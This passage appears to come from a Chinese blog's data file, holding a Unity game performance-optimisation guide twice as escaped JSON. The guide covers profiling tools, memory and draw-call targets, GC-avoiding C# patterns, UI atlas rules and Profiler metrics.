2:如果要发行其他国家的版本需要重新Copy一份客户端代码,在另行修改\n* 3:c#扩展做链式语法非常容易,比如项目里面的WWWFormEx类的数据装载,非常好写.\n* 4:写好代码一定要多个平台测试\n* 5:编程代码规范不是一成不变的,需要根据人数,风格进行有效的变换\n\n\n# 善用工具检测\n\n* 1:使用Unity自带的工具 [profile](https://unity3d.com/cn/learn/tutorials/temas/performance-optimization/diagnosing-performance-problems-using-profiler-window?playlist=44069),Frame Debug,Physics Debug,[数据类型](https://unity3d.com/cn/learn/tutorials/topics/scripting/data-types),[对象池](https://unity3d.com/cn/learn/tutorials/topics/scripting/object-pooling),[官方视频](https://learn.unity.com/tutorial/fixing-performance-problems#),\n* 2:使用 UPR\n* 3:使用 UWA\n* 4:使用 XCode 编辑器\n* 5:使用 Android studio 编辑器\n* 6:君子善用其器.一定要先了解一下这个工具再对其进行使用.\n\n\n# 宏观性能关注点\n\n* 1:FPS 帧率需要大于 30 帧\n* 2:PSS 内存,越低越好,但需要根据渠道而定\n* 3:Mono峰值,小于 40M\n* 4:温度均值,越低越好\n* 5:能耗均值,电量,越低越好\n* 6:网络上传\n* 7:网络下载\n\n\n# 微观性能关注点\n\n模块    |          前期           |         中期        |后期&上线\n-------|-------------------------|--------------------|--------------\n渲染模块|Draw Call,Triangle,vertex|不透明,半透明,Culling|图像后处理\n逻辑代码| 插件,第三方库调研,bug      |CPU,堆内存,调用次数  |bug\nUI 模块|全屏,半屏,组织结构          |overdraw,重建 CPU   |Draw Call\nUGUI的API|Canvas.BuildBatch,Canvas.SendWillRenderCanvases|EventSystem.Update|RenderSubBatch\n加载模块|缓存池,序列化第三方库        |关注调用频率        |关注耗时\n加载模块的API|Loading.UpdatePreloading,Resources.UnloadUnusedAssets|GameObject.Instantiate|GC.Collect\n资源使用|分辨率,格式,顶点数,骨骼数    |数量,Mipmap,资源利用率,沉余|调用次数\n内存占用|资源,AB 包,Mono,Lua       |内存峰值,堆内存      |内存泄露\n粒子系统|使用指标                  |总体数量,active 数量 |Overdraw\n粒子系统的 API|ParticleSystem.Update,ParticleSystem.SubmitVBO,ParticleSystem.Draw|ParticleSystem.ScheduleGeometryJobs\n动画系统|                        |数量,AC 制作,CPU      |\n动画系统的 API|Animators.Update,Animation.Update|MeshSkinning.Update|Animator.Initialize\n\n\n# 官方数值建议\n\n\n数值名称    |     官方建议数值\n-----------|-------------------------\nReservedMono峰值(MB)|小于 80MB\nDrawCall峰值(次)| 小于 250 次\n平均帧率|大于 25\n纹理资源峰值(MB)|小于 50MB    \n网格资源峰值(MB)|小于 20MB\n动画资源峰值(MB)|小于 15MB\n音频资源峰值(MB)|小于 15MB\nTris 峰值(面)  |小于 200000(20W 面)             \n\n\n# CPU 优化\n\n* 1:简单代码控制,避免CPU资源浪费\n* 2:避免使用闭包\n* 3:MonoBehaviour优化\n* 4:Component的优化\n* 5:GameObject的优化\n\n\n# GPU 优化\n\n\n\n# 内存优化\n\n\n\n# UI 优化\n\n* 1:NGUI 的优化\n* 2:UGUI 的优化\n\n\n# 资源优化\n\n* AssetBundle\n* 打包\n\n\n# 渲染优化\n\n* shader\n\n\n# 扩展阅读\n\n* 1:[守望先锋:ECS架构](http://gad.qq.com/article/detail/28682),[Unity官方文档](https://docs.unity3d.com/Packages/com.unity.entities@0.1/manual/index.html),[云风](http://blog.codingnow.com/2017/06/overwatch_ecs.html),[ECS博客](http://t-machine.org/index.php/2007/09/03/entity-systems-are-the-future-of-mmog-development-part-1/),[国外谈论](https://www.youtube.com/watch?v=lNTaC-JWmdI),[Entitas-CSharp]( https://github.com/sschmid/Entitas-CSharp),[ET框架](https://github.com/egametang/ET)\n* 2:推荐想学习优化的同学一本书,<<Unity 游戏优化 2>>,作者是:克里斯*迪金森,翻译:蔡俊鸿,雷鸿飞.\n\n\n# 代码控制\n\n* 1: 尽量不用foreach,全使用for,因为foreach产生GC\n* 2: 字典替换成下面的写法\n\n        var enumerator = m_Dictionary.GetEnumerator();\n        while (enumerator.MoveNext())\n        {\n            var element = enumerator.Current;\n            element.Value.UpdateComponent(deltaTime);\n        }\n* 3: 字符串 + 号拼接不超过约10次,不会产生GC,如果超过10次,要使用StringBuilder进行拼接,不会产生GC\n* 4: Struct 与 Class  如何装箱或拆箱少，堆内存少,Struct 在栈中不产生 GC，class 在堆中，会产生 GC。对 Struct 的结点修改时，修改完以后记得重新赋值。因为 Struct 赋值是 copy\n而不是引用，修改完以后，以前的不生效。\n* 5: 堆栈的空间有限，对于大量的逻辑的对象，创建类要比创建结构好一些。\n结构表示轻量对象，并且结构的成本较低，适合处理大量短暂的对象。\n在表现抽象和多级别的对象层次时，类是最好的选择。\n大多数情况下该类型只是一些数据时，结构是最佳的选择。\n* 6: 数组，ArrayList，List 的区别;\n\n>数组：内存中是连续存储的，索引速度非常快，赋值与修改元素也很简单。但不\n利于动态扩展以及移动。\n>ArrayList: 因为数组的缺点，就产生了 ArrayList。ArrayList：使用该类时必须进行引用，同时继承了 IList 接口，提供了数据存储和检索，ArrayList 对象的大小动态伸缩，支持不同类型的结点。\nArrayList 虽然很完美，但结点类型是 Object，故不是类型安全的，也可能发生\n装箱和拆箱操作，带来很大的性能耗损。对象是值类型的话会带来装箱拆箱操作\n>List 是泛型接口，规避了 ArrayList 的两个问题。利于动态扩展以及移动,但是搜索速度慢\n\n* 7: 不要把枚举当 TKey (字典的key)使用，不要把枚举转成 string 使用。\n\n# 闭包\n\n* 1:变量的作用域,成员变量作用于类、局部变量作用于函数、次局部变量作用于函数局部\n片段。生命周期：变量随着其寄存对象生而生和消亡（不包括非实例化的 static 和 const\n对象）。\n* 2:委托概念：是一个类型安全的对象，它指向程序中另一个以后会被调用的方法（或\n多个方法）。通俗的说，委托是一个可以引用方法的对象，当创建一个委托，也\n就创建一个引用方法的对象，进而就可以调用那个方法，即委托可以调用它所指\n的方法。如何没有涉及到闭包的话，委托代码只生产一个函数而不是一个类。lamda表达式(闭包)\n* 3:    闭包概念：函数和与其相关的引用环境组合而成的实体。本质 1：代码块依然维护着它第一个被创建时环境（执行上下文）- 即它仍可以使用创建它的方法中局部变量，即使那个方法已经执行完了。(循环引用不释放);本质 2 Closures close over variables, not over values。闭包关闭的是变量，而不是值.闭包引用了外部变量就会生成一个新得类.函数调用频繁不使用闭包\n\n# MonoBehaviour 优化\n\n* 1:如果没有相应的事件处理，删除对应的空函数\n* 2:Update 优化 在 update 中尽量不要调用查找对象或组件方法如 FindByTag 或 Find 等等。可\n以在 start 中先缓存下来，然后使用。 如果没必要每帧的逻辑，可以降低频率，方法如下：\n\n        Void Update（）{if（Time.frameCount%6==0）{DoSomething();}}\n* 3:如果没必要每帧的逻辑，可以使用周期性的协程,如果没必要每帧的逻辑，可以使用InvokeRepeating(\"DoSomeThing\",0.5f,1.0f);\n* 4:Gameobject 不可见时，设置 enabled = false 时，update 就会停止调用。\n* 5:协程有优化:yield return null;每帧产生9个字节的GC垃圾,其余函数也会产生GC垃圾,需要使提前预生成方式\n\n        WaitForSeconds wfs = new WaitForSeconds(0.1f);\n        IEnumerator AtlasTextureSetting()\n        {\n            yield return wfs;\n        }\n\n# Component 优化\n\n* 1:使用内建的数组，比如用 Vector3.zero 而不是 new Vector(0, 0, 0);\n* 2:transform.localRotation = Quaternion.Euler(Vector3.zero);transform.localScale =Vector3.one;transform.localPosition =Vector3.one;等\n\n# GameObject 相关优化\n\n* 1:（脚本和本地引擎 C++代码之间的通信开销）Gameobject 缓存：类似组件的缓存策略。查找对象标签：if (go.CompareTag (“xxx”)来代替 if (go.tag == “xxx”)，因为内部循环调用对象分配的标签属性以及拷贝额外内存。SendMessageUpwards、SendMessage：少用这两个函数，使用委托替代。缓存组件：调用 GetComponent 函数耗性能，用变量先缓存到内存在使用, 有必要时记得更新缓存组件。\n\n# NGUI 相关优化\n\n* 1: Canvas.BuildBatch()，\n合批 Canvas 下所有网格，这个性能热点在 5.2 版本后挪到了子线程去做减轻了\n主线程的压力，而 NGUI 作为一个插件没法做到这一点，网格合批的性能热点还\n是耗在主线程的 UIPanel.LateUpdate()；\n* 2 : UGUI 的 UIMesh 生成是通过底层 C++代码实\n现的，而 NGUI 只能通过上层的不断创建 Vertex List，这样在堆内存的管理上，\nUGUI 确实要好很多，带来的隐形收益就是 GC 触发次数会少很多。\n\n# UI 资源规范（内存优化）\n\n* 1:任何的 UI 图集最大 size 1024*1024（内存优化）；\n* 2:同一个界面出现的 UI 资源尽量放到一个图集，重复利用的公用资源放\ncommon（DrawCall 优化）；\n* 3:能用九宫格的尽量用九宫格来减小原图大小（内存优化）；\n* 4.美术给过来的 UI 原图 size 尽量小，对于一些全屏的 loading 原画图，原画大\n小是 1280 * 720，让美术按照比例高度缩小到 500，\n这样一张 1024*1024 的图集就可以放两张原图了，提升图集利用率。对于一些\n600*400 类似大小的原图，就尽量按比例把最长边压小到 500，这样出来的图\n集就是 512 * 512 而不是 1024 * 1024（内存优化）；\n* 5.对于特别长条的 UI 原图，例如 1000*100，如果由于加入这个长条的原图导\n致图集大小变大而且利用率很低的话，要把 1000*100 的原图拆分成两张图\n500*100，在制作界面的时候用两个 Image 拼接即可，这样可以把 1024 的图\n集缩小到 512（内存优化）；\n* 6.图集利用率低于 1/3 的时候，要考虑和其他同一个 size 的图集合并以提升利\n用率。合并的原则是不改变任何一个图集的大小，这样即可完全省掉一张图集（内\n存优化、安装包量优化）；\n* 7.尽量复用 UI 资源，减少不必要的原图，例如一个卡牌分了五种品质原画底图，\n白蓝黄绿紫，就不要使用五张大底图了，让美术同事画一个灰色原图，Image 在\n使用的时候直接按需求修改顶点色即可（内存优化）；\n* 8.关闭 mipmaps（内存优化）。\n\n# GPU 优化\n\n#### Shader优化\n\n* 1:Fog { Mode Off }，最早有一个版本我们没有关闭 Fog\n* 2:Fragment 剔除掉 Alpha 为 0 的像素点，减少 OverDraw；\n* 3:OverDraw 优化,在每帧绘制中，如果一个像素被反复绘制的次数越多，那么它占用的资源也必然\n更多。目前在移动设备上，OverDraw 的压力主要来自半透明物体。因为多数情\n况下，半透明物体需要开启 Alpha Blend 且关闭 ZWrite，同时如果我们绘制\n像 alpha=0 这种实际上不会产生效果的颜色上去，也同样有 Blend 操作，这是\n一种极大的浪费。我们的 UI 绘制是 Alpha Blend 且关闭 ZWrite，因此 UI OverDraw 的优化主要\n是在制作界面的时候减少 UI 重叠层级（和策划、美术 pk）。除此之外还是有一\n些我们程序可以控制的优化点：1.对于九宫格的 Image，如果去掉 fillcenter 不影响最后出来的效果就要把\nfillcenter 去掉，可以减少中间一片的像素绘制；2.看不见的元素且没有逻辑功能要 disable 或者挪出裁剪区域，而不要通过设置Alpha=0 来隐藏；3.不要使用一张 Alpha=0 的 Image 来实现放大响应区域的功能；4.UI 底层系统来控制隐藏看不见的元素，例如打开全屏 UI 的时候把下面看不见的 UI 挪出裁减区域、关闭主相机渲染。\n\n#### CPU优化\n\n* 1:优化DrawCall、Canvas.SendWillRenderCanvases()、Canvas.BuildBatch()\n* 2:DrawCall,DrawCall 是 CPU 调用底层图形接口，频繁的调用对 CPU 性能的影响是很明显\n的。优化思路很简单，合批绘制。UGUI 本身的动态合批机制会帮我们尽量的去\n优化合批，我们要做的就是弄清楚它的合批机制然后让 UI 元素尽量合批绘制。合理分配图集，同一个界面上的图尽量打到一个图集，多个界面复用的图，放到 common；\n* 3:制作界面的时候，相邻节点尽量使用同一个图集的图片；\n* 4:Text 本身也是用的 Font Texture，不同字体的 Text 也是来自不同的图集，所\n以在布局界面的时候也要尽量避免穿插打断绘制流程；\n* 5:DrawCall 的数量不是完全由 Hierarchy 的布局决定，和 UI 的位置也有关系，\n这个位置不是指的 Rectranform 上面的 size 位置重叠就一定打断绘制，而是真\n实的三角面的位置是否重叠。这个可以在 Scene 视图下用线框模式(Texture\nWire)去观察；\n* 6:.少用 Mask 组件，Mask 实现的原理是 Stencil Buffer，往模版缓存里绘制，\n模版缓存里的东西才是可见的。模板缓存会打断所有的合批，Mask 的子节点和\n外面的节点无法合批，模板缓存自己占一个 DrawCall。Unity5.2 之后的版本建\n议使用 2D Rect Mask 替代。\n\n# Profiler介绍及优化\n\n* 1: WaitForTargetFPS: Vsync(垂直同步)功能，即显示当前帧的CPU等待时间\n* 2: Camera.Render: 相机渲染准备工作的CPU占用量 \n* 3: Shader.Parse: 资源加入后引擎对Shader的解析过程\n* 4: Reserved Total:系统在当前帧的申请内存\n* 5: GameObjects in Scene:当前帧场景中的GameObject数量\n* 6: Total Objects in Scene:当前帧场景中的Object数量(除GameObject外，还有Component等). \n* 7: Total Object Count: Object数据 + Asset数量. \n* 8: Assets: Texture2d:记录当前帧内存中所使用的纹理资源情况，包括各种GameObject的纹理、天空盒纹理以及场景中所用的Lightmap资源.\n* 9: Scene Memory:记录当前场景中各个方面的内存占用情况，包括GameObject、所用资源、各种组件以及GameManager等（天般情况通过AssetBundle加载的不会显示在这里). \n* 10: Other:ManagedHeap.UseSize:代码在运行时造成的堆内存分配，表示上次GC到目前为止所分配的堆内存量. SerializedFile(3): WebStream:这个是由WWW来进行加载的内存占用. System.ExecutableAndDlls:不同平台和不同硬件得到的值会不一样。 \n\n#####[优化重点](https://blog.csdn.net/yangyy753/article/details/47025205)\n> A:CPU-GC Allow:1.检测任何一次性内存分配大于2KB的选项 2.检测每帧都具有20B以上内存分配的选项. \n> B:Time ms:记录游戏运行时每帧CPU占用（特别注意占用5ms以上的）. \n> C:Memory Profiler-Other:1.ManagedHeap.UsedSize: 移动游戏建议不要超过20MB. 2.SerializedFile: 通过异步加载(LoadFromCache、WWW等)的时候留下的序列化文件,可监视是否被卸载.  3.WebStream: 通过异步WWW下载的资源文件在内存中的解压版本,比SerializedFile大几倍或几十倍,重点监视.\n> D: Memory Profiler-Assets: 1.Texture2D: 重点检查是否有重复资源和超大Memory是否需要压缩等. 2.AnimationClip: 重点检查是否有重复资源.  3.Mesh： 重点检查是否有重复资源. \n> E:Device.Present: 1.GPU的presentdevice确实非常耗时，一般出现在使用了非常复杂的shader. \n2.GPU运行的非常快，而由于Vsync的原因，使得它需要等待较长的时间. \n3.同样是Vsync的原因，但其他线程非常耗时，所以导致该等待时间很长，比如：过量AssetBundle加载时容易出现该问题.4.Shader.CreateGPUProgram:Shader在runtime阶段（非预加载）会出现卡顿(华为K3V2芯片). \n> F:StackTraceUtility.PostprocessStacktrace()和StackTraceUtility.ExtractStackTrace():  1.一般是由Debug.Log或类似API造成. 2.游戏发布后需将Debug API进行屏蔽. \n> G:GC.Collect: 原因: 1.代码分配内存过量(恶性的) 2.一定时间间隔由系统调用(良性的). 占用时间：1.与现有Garbage size相关 2.与剩余内存使用颗粒相关（比如场景物件过多，利用率低的情况下，GC释放后需要做内存重排) \n> H:GarbageCollectAssetsProfile:1.引擎在执行UnloadUnusedAssets操作(该操作是比较耗时的,建议在切场景的时候进行). 2.尽可能地避免使用Unity内建GUI，避免GUI.Repaint过渡GC Allow. 3.if(other.tag == GearParent.MogoPlayerTag)改为other.CompareTag(GearParent.MogoPlayerTag).因为other.tag为产生180B的GC Allow.\n> I:少用foreach，因为每次foreach为产生一个enumerator(约16B的内存分配)，尽量改为for. Lambda表达式，使用不当会产生内存泄漏. 尽量少用LINQ:1.部分功能无法在某些平台使用. 2.会分配大量GC Allow.\n> J:控制StartCoroutine的次数：  1.开启一个Coroutine(协程)，至少分配37B的内存. 2.Coroutine类的实例 -- 21B.  3.Enumerator -- 16B.缓存组件: 1.每次GetComponent均会分配一定的GC Allow. 2.每次Object.name都会分配39B的堆内存.\n> K:1:许多贴图采用的Format格式是ARGB 32 bit所以保真度很高但占用的内存也很大。在不失真的前提下，适当压缩贴图，使用ARGB 16 bit就会减少一倍，如果继续Android采用RGBA Compressed ETC2 8 bits（iOS采用RGBA Compressed PVRTC 4 bits），又可以再减少一倍。把不需要透贴但有alpha通道的贴图，全都转换格式Android：RGB Compressed ETC 4 bits，iOS：RGB Compressed PVRTC 4 bits。2:当加载一个新的Prefab或贴图，不及时回收，它就会永驻在内存中，就算切换场景也不会销毁。应该确定物体不再使用或长时间不使用就先把物体制空(null)，然后调用Resources.UnloadUnusedAssets()，才能真正释放内存。3:有大量空白的图集贴图，可以用TexturePacker等工具进行优化或考虑合并到其他图集中。4:要保证每张图得像素宽高都是4得倍数,即除4余0.\n> L:AudioClip:播放时长较长的音乐文件需要进行压缩成.mp3或.ogg格式，时长较短的音效文件可以使用.wav 或.aiff格式。\n\n\n","source":"_posts/Unity/Optimize/Unity优化总纲.md","raw":"---\ntitle: Unity 优化总纲\ndate: 2020-05-08 11:41:32\ntop: 1\ncategories:\n- Unity优化\ntags:\n- Unity优化\n---\n\n\n# 编程代码规范\n\n* 1:脚本行数最多500行。\n* 2:如果要发行其他国家的版本需要重新Copy一份客户端代码,在另行修改\n* 3:c#扩展做链式语法非常容易,比如项目里面的WWWFormEx类的数据装载,非常好写.\n* 4:写好代码一定要多个平台测试\n* 5:编程代码规范不是一成不变的,需要根据人数,风格进行有效的变换\n\n\n# 善用工具检测\n\n* 1:使用Unity自带的工具 [profile](https://unity3d.com/cn/learn/tutorials/temas/performance-optimization/diagnosing-performance-problems-using-profiler-window?playlist=44069),Frame Debug,Physics Debug,[数据类型](https://unity3d.com/cn/learn/tutorials/topics/scripting/data-types),[对象池](https://unity3d.com/cn/learn/tutorials/topics/scripting/object-pooling),[官方视频](https://learn.unity.com/tutorial/fixing-performance-problems#),\n* 2:使用 UPR\n* 3:使用 UWA\n* 4:使用 XCode 编辑器\n* 5:使用 Android studio 编辑器\n* 6:君子善用其器.一定要先了解一下这个工具再对其进行使用.\n\n\n# 宏观性能关注点\n\n* 1:FPS 帧率需要大于 30 帧\n* 2:PSS 内存,越低越好,但需要根据渠道而定\n* 3:Mono峰值,小于 40M\n* 4:温度均值,越低越好\n* 5:能耗均值,电量,越低越好\n* 6:网络上传\n* 7:网络下载\n\n\n# 微观性能关注点\n\n模块    |          前期           |         中期        |后期&上线\n-------|-------------------------|--------------------|--------------\n渲染模块|Draw Call,Triangle,vertex|不透明,半透明,Culling|图像后处理\n逻辑代码| 插件,第三方库调研,bug      |CPU,堆内存,调用次数  |bug\nUI 模块|全屏,半屏,组织结构          |overdraw,重建 CPU   |Draw Call\nUGUI的API|Canvas.BuildBatch,Canvas.SendWillRenderCanvases|EventSystem.Update|RenderSubBatch\n加载模块|缓存池,序列化第三方库        |关注调用频率        |关注耗时\n加载模块的API|Loading.UpdatePreloading,Resources.UnloadUnusedAssets|GameObject.Instantiate|GC.Collect\n资源使用|分辨率,格式,顶点数,骨骼数    |数量,Mipmap,资源利用率,沉余|调用次数\n内存占用|资源,AB 包,Mono,Lua       |内存峰值,堆内存      |内存泄露\n粒子系统|使用指标                  |总体数量,active 数量 |Overdraw\n粒子系统的 API|ParticleSystem.Update,ParticleSystem.SubmitVBO,ParticleSystem.Draw|ParticleSystem.ScheduleGeometryJobs\n动画系统|                        |数量,AC 制作,CPU      |\n动画系统的 API|Animators.Update,Animation.Update|MeshSkinning.Update|Animator.Initialize\n\n\n# 官方数值建议\n\n\n数值名称    |     官方建议数值\n-----------|-------------------------\nReservedMono峰值(MB)|小于 80MB\nDrawCall峰值(次)| 小于 250 次\n平均帧率|大于 25\n纹理资源峰值(MB)|小于 50MB    \n网格资源峰值(MB)|小于 20MB\n动画资源峰值(MB)|小于 15MB\n音频资源峰值(MB)|小于 15MB\nTris 峰值(面)  |小于 200000(20W 面)             \n\n\n# CPU 优化\n\n* 1:简单代码控制,避免CPU资源浪费\n* 2:避免使用闭包\n* 3:MonoBehaviour优化\n* 4:Component的优化\n* 5:GameObject的优化\n\n\n# GPU 优化\n\n\n\n# 内存优化\n\n\n\n# UI 优化\n\n* 1:NGUI 的优化\n* 2:UGUI 的优化\n\n\n# 资源优化\n\n* AssetBundle\n* 打包\n\n\n# 渲染优化\n\n* shader\n\n\n# 扩展阅读\n\n* 1:[守望先锋:ECS架构](http://gad.qq.com/article/detail/28682),[Unity官方文档](https://docs.unity3d.com/Packages/com.unity.entities@0.1/manual/index.html),[云风](http://blog.codingnow.com/2017/06/overwatch_ecs.html),[ECS博客](http://t-machine.org/index.php/2007/09/03/entity-systems-are-the-future-of-mmog-development-part-1/),[国外谈论](https://www.youtube.com/watch?v=lNTaC-JWmdI),[Entitas-CSharp]( https://github.com/sschmid/Entitas-CSharp),[ET框架](https://github.com/egametang/ET)\n* 2:推荐想学习优化的同学一本书,<<Unity 游戏优化 2>>,作者是:克里斯*迪金森,翻译:蔡俊鸿,雷鸿飞.\n\n\n# 代码控制\n\n* 1: 尽量不用foreach,全使用for,因为foreach产生GC\n* 2: 字典替换成下面的写法\n\n        var enumerator = m_Dictionary.GetEnumerator();\n        while (enumerator.MoveNext())\n        {\n            var element = enumerator.Current;\n            element.Value.UpdateComponent(deltaTime);\n        }\n* 3: 字符串 + 号拼接不超过约10次,不会产生GC,如果超过10次,要使用StringBuilder进行拼接,不会产生GC\n* 4: Struct 与 Class  如何装箱或拆箱少，堆内存少,Struct 在栈中不产生 GC，class 在堆中，会产生 GC。对 Struct 的结点修改时，修改完以后记得重新赋值。因为 Struct 赋值是 copy\n而不是引用，修改完以后，以前的不生效。\n* 5: 堆栈的空间有限，对于大量的逻辑的对象，创建类要比创建结构好一些。\n结构表示轻量对象，并且结构的成本较低，适合处理大量短暂的对象。\n在表现抽象和多级别的对象层次时，类是最好的选择。\n大多数情况下该类型只是一些数据时，结构是最佳的选择。\n* 6: 数组，ArrayList，List 的区别;\n\n>数组：内存中是连续存储的，索引速度非常快，赋值与修改元素也很简单。但不\n利于动态扩展以及移动。\n>ArrayList: 因为数组的缺点，就产生了 ArrayList。ArrayList：使用该类时必须进行引用，同时继承了 IList 接口，提供了数据存储和检索，ArrayList 对象的大小动态伸缩，支持不同类型的结点。\nArrayList 虽然很完美，但结点类型是 Object，故不是类型安全的，也可能发生\n装箱和拆箱操作，带来很大的性能耗损。对象是值类型的话会带来装箱拆箱操作\n>List 是泛型接口，规避了 ArrayList 的两个问题。利于动态扩展以及移动,但是搜索速度慢\n\n* 7: 不要把枚举当 TKey (字典的key)使用，不要把枚举转成 string 使用。\n\n# 闭包\n\n* 1:变量的作用域,成员变量作用于类、局部变量作用于函数、次局部变量作用于函数局部\n片段。生命周期：变量随着其寄存对象生而生和消亡（不包括非实例化的 static 和 const\n对象）。\n* 2:委托概念：是一个类型安全的对象，它指向程序中另一个以后会被调用的方法（或\n多个方法）。通俗的说，委托是一个可以引用方法的对象，当创建一个委托，也\n就创建一个引用方法的对象，进而就可以调用那个方法，即委托可以调用它所指\n的方法。如何没有涉及到闭包的话，委托代码只生产一个函数而不是一个类。lamda表达式(闭包)\n* 3:    闭包概念：函数和与其相关的引用环境组合而成的实体。本质 1：代码块依然维护着它第一个被创建时环境（执行上下文）- 即它仍可以使用创建它的方法中局部变量，即使那个方法已经执行完了。(循环引用不释放);本质 2 Closures close over variables, not over values。闭包关闭的是变量，而不是值.闭包引用了外部变量就会生成一个新得类.函数调用频繁不使用闭包\n\n# MonoBehaviour 优化\n\n* 1:如果没有相应的事件处理，删除对应的空函数\n* 2:Update 优化 在 update 中尽量不要调用查找对象或组件方法如 FindByTag 或 Find 等等。可\n以在 start 中先缓存下来，然后使用。 如果没必要每帧的逻辑，可以降低频率，方法如下：\n\n        Void Update（）{if（Time.frameCount%6==0）{DoSomething();}}\n* 3:如果没必要每帧的逻辑，可以使用周期性的协程,如果没必要每帧的逻辑，可以使用InvokeRepeating(\"DoSomeThing\",0.5f,1.0f);\n* 4:Gameobject 不可见时，设置 enabled = false 时，update 就会停止调用。\n* 5:协程有优化:yield return null;每帧产生9个字节的GC垃圾,其余函数也会产生GC垃圾,需要使提前预生成方式\n\n        WaitForSeconds wfs = new WaitForSeconds(0.1f);\n        IEnumerator AtlasTextureSetting()\n        {\n            yield return wfs;\n        }\n\n# Component 优化\n\n* 1:使用内建的数组，比如用 Vector3.zero 而不是 new Vector(0, 0, 0);\n* 2:transform.localRotation = Quaternion.Euler(Vector3.zero);transform.localScale =Vector3.one;transform.localPosition =Vector3.one;等\n\n# GameObject 相关优化\n\n* 1:（脚本和本地引擎 C++代码之间的通信开销）Gameobject 缓存：类似组件的缓存策略。查找对象标签：if (go.CompareTag (“xxx”)来代替 if (go.tag == “xxx”)，因为内部循环调用对象分配的标签属性以及拷贝额外内存。SendMessageUpwards、SendMessage：少用这两个函数，使用委托替代。缓存组件：调用 GetComponent 函数耗性能，用变量先缓存到内存在使用, 有必要时记得更新缓存组件。\n\n# NGUI 相关优化\n\n* 1: Canvas.BuildBatch()，\n合批 Canvas 下所有网格，这个性能热点在 5.2 版本后挪到了子线程去做减轻了\n主线程的压力，而 NGUI 作为一个插件没法做到这一点，网格合批的性能热点还\n是耗在主线程的 UIPanel.LateUpdate()；\n* 2 : UGUI 的 UIMesh 生成是通过底层 C++代码实\n现的，而 NGUI 只能通过上层的不断创建 Vertex List，这样在堆内存的管理上，\nUGUI 确实要好很多，带来的隐形收益就是 GC 触发次数会少很多。\n\n# UI 资源规范（内存优化）\n\n* 1:任何的 UI 图集最大 size 1024*1024（内存优化）；\n* 2:同一个界面出现的 UI 资源尽量放到一个图集，重复利用的公用资源放\ncommon（DrawCall 优化）；\n* 3:能用九宫格的尽量用九宫格来减小原图大小（内存优化）；\n* 4.美术给过来的 UI 原图 size 尽量小，对于一些全屏的 loading 原画图，原画大\n小是 1280 * 720，让美术按照比例高度缩小到 500，\n这样一张 1024*1024 的图集就可以放两张原图了，提升图集利用率。对于一些\n600*400 类似大小的原图，就尽量按比例把最长边压小到 500，这样出来的图\n集就是 512 * 512 而不是 1024 * 1024（内存优化）；\n* 5.对于特别长条的 UI 原图，例如 1000*100，如果由于加入这个长条的原图导\n致图集大小变大而且利用率很低的话，要把 1000*100 的原图拆分成两张图\n500*100，在制作界面的时候用两个 Image 拼接即可，这样可以把 1024 的图\n集缩小到 512（内存优化）；\n* 6.图集利用率低于 1/3 的时候，要考虑和其他同一个 size 的图集合并以提升利\n用率。合并的原则是不改变任何一个图集的大小，这样即可完全省掉一张图集（内\n存优化、安装包量优化）；\n* 7.尽量复用 UI 资源，减少不必要的原图，例如一个卡牌分了五种品质原画底图，\n白蓝黄绿紫，就不要使用五张大底图了，让美术同事画一个灰色原图，Image 在\n使用的时候直接按需求修改顶点色即可（内存优化）；\n* 8.关闭 mipmaps（内存优化）。\n\n# GPU 优化\n\n#### Shader优化\n\n* 1:Fog { Mode Off }，最早有一个版本我们没有关闭 Fog\n* 2:Fragment 剔除掉 Alpha 为 0 的像素点，减少 OverDraw；\n* 3:OverDraw 优化,在每帧绘制中，如果一个像素被反复绘制的次数越多，那么它占用的资源也必然\n更多。目前在移动设备上，OverDraw 的压力主要来自半透明物体。因为多数情\n况下，半透明物体需要开启 Alpha Blend 且关闭 ZWrite，同时如果我们绘制\n像 alpha=0 这种实际上不会产生效果的颜色上去，也同样有 Blend 操作，这是\n一种极大的浪费。我们的 UI 绘制是 Alpha Blend 且关闭 ZWrite，因此 UI OverDraw 的优化主要\n是在制作界面的时候减少 UI 重叠层级（和策划、美术 pk）。除此之外还是有一\n些我们程序可以控制的优化点：1.对于九宫格的 Image，如果去掉 fillcenter 不影响最后出来的效果就要把\nfillcenter 去掉，可以减少中间一片的像素绘制；2.看不见的元素且没有逻辑功能要 disable 或者挪出裁剪区域，而不要通过设置Alpha=0 来隐藏；3.不要使用一张 Alpha=0 的 Image 来实现放大响应区域的功能；4.UI 底层系统来控制隐藏看不见的元素，例如打开全屏 UI 的时候把下面看不见的 UI 挪出裁减区域、关闭主相机渲染。\n\n#### CPU优化\n\n* 1:优化DrawCall、Canvas.SendWillRenderCanvases()、Canvas.BuildBatch()\n* 2:DrawCall,DrawCall 是 CPU 调用底层图形接口，频繁的调用对 CPU 性能的影响是很明显\n的。优化思路很简单，合批绘制。UGUI 本身的动态合批机制会帮我们尽量的去\n优化合批，我们要做的就是弄清楚它的合批机制然后让 UI 元素尽量合批绘制。合理分配图集，同一个界面上的图尽量打到一个图集，多个界面复用的图，放到 common；\n* 3:制作界面的时候，相邻节点尽量使用同一个图集的图片；\n* 4:Text 本身也是用的 Font Texture，不同字体的 Text 也是来自不同的图集，所\n以在布局界面的时候也要尽量避免穿插打断绘制流程；\n* 5:DrawCall 的数量不是完全由 Hierarchy 的布局决定，和 UI 的位置也有关系，\n这个位置不是指的 Rectranform 上面的 size 位置重叠就一定打断绘制，而是真\n实的三角面的位置是否重叠。这个可以在 Scene 视图下用线框模式(Texture\nWire)去观察；\n* 6:.少用 Mask 组件，Mask 实现的原理是 Stencil Buffer，往模版缓存里绘制，\n模版缓存里的东西才是可见的。模板缓存会打断所有的合批，Mask 的子节点和\n外面的节点无法合批，模板缓存自己占一个 DrawCall。Unity5.2 之后的版本建\n议使用 2D Rect Mask 替代。\n\n# Profiler介绍及优化\n\n* 1: WaitForTargetFPS: Vsync(垂直同步)功能，即显示当前帧的CPU等待时间\n* 2: Camera.Render: 相机渲染准备工作的CPU占用量 \n* 3: Shader.Parse: 资源加入后引擎对Shader的解析过程\n* 4: Reserved Total:系统在当前帧的申请内存\n* 5: GameObjects in Scene:当前帧场景中的GameObject数量\n* 6: Total Objects in Scene:当前帧场景中的Object数量(除GameObject外，还有Component等). \n* 7: Total Object Count: Object数据 + Asset数量. \n* 8: Assets: Texture2d:记录当前帧内存中所使用的纹理资源情况，包括各种GameObject的纹理、天空盒纹理以及场景中所用的Lightmap资源.\n* 9: Scene Memory:记录当前场景中各个方面的内存占用情况，包括GameObject、所用资源、各种组件以及GameManager等（天般情况通过AssetBundle加载的不会显示在这里). \n* 10: Other:ManagedHeap.UseSize:代码在运行时造成的堆内存分配，表示上次GC到目前为止所分配的堆内存量. 